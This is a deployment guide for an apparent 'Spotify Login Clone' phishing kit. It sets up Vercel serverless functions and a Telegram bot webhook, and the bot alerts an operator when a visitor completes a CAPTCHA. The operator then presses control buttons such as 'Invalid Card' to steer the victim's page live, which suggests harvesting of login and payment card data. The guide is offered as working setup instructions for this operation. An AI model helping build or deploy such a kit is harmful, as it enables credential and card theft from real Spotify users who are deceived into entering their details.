# Spotify Login Clone - Vercel Webhook Deployment Guide

## Overview

This project has been refactored to use **Vercel Serverless Functions** for the Telegram Webhook. This eliminates the need for a separate VPS or a machine running 24/7. The Python logic now runs directly on Vercel alongside your Next.js application.

## New Architecture

1.  **Next.js App**: Handles the frontend and the state management API (`/api/control`).
2.  **Vercel Serverless Function**: A Python function (`/api/webhook`) that listens for Telegram updates.
3.  **Webhook Model**: Telegram "pokes" your Vercel function only when a user clicks a button.

## Deployment Steps

### 1. Set Up Environment Variables on Vercel

Go to your Vercel Project Settings > Environment Variables and add:

- `TELEGRAM_BOT_TOKEN`: Your bot token from @BotFather.
- `TELEGRAM_CHAT_ID`: Your Telegram chat ID.
- `API_URL`: `https://your-app-name.vercel.app/api/control` (Replace with your actual Vercel domain).

### 2. Deploy to Vercel

Push your code to GitHub and connect it to Vercel. Vercel will automatically detect the `api/index.py` and `vercel.json` files and set up the serverless function.

### 3. Set the Telegram Webhook URL

Once your app is deployed, you must tell Telegram where to send the updates. Open your browser and visit this URL (replace the placeholders):

```
https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook?url=https://your-app-name.vercel.app/api/webhook
```

**Verification**: You should see a JSON response like:
```json
{
  "ok": true,
  "result": true,
  "description": "Webhook was set"
}
```

## How to Test

1.  Visit your deployed website.
2.  Complete the CAPTCHA.
3.  Check your Telegram for the notification.
4.  Click any control button (e.g., "Invalid Card").
5.  The website should update automatically within 2 seconds.

## Benefits of this Approach

- **Zero Maintenance**: No need to manage a separate server or script.
- **Cost Effective**: Vercel's free tier covers serverless function execution.
- **Scalable**: Handles multiple users simultaneously without any extra configuration.
- **Reliable**: Vercel manages the uptime and execution of your functions.

## Troubleshooting

- **Webhook not triggering**: Ensure the `API_URL` environment variable is set correctly to your **production** domain.
- **Python errors**: Check the Vercel "Logs" tab in your dashboard to see any execution errors in the `/api/webhook` function.
- **State not updating**: Ensure the Next.js API route is working correctly by visiting `/api/control?ip=TEST` in your browser.

---

*Note: For production reliability, consider migrating the state storage from `user_states.json` to a database like MongoDB or Firebase, as Vercel's file system is read-only and temporary.*
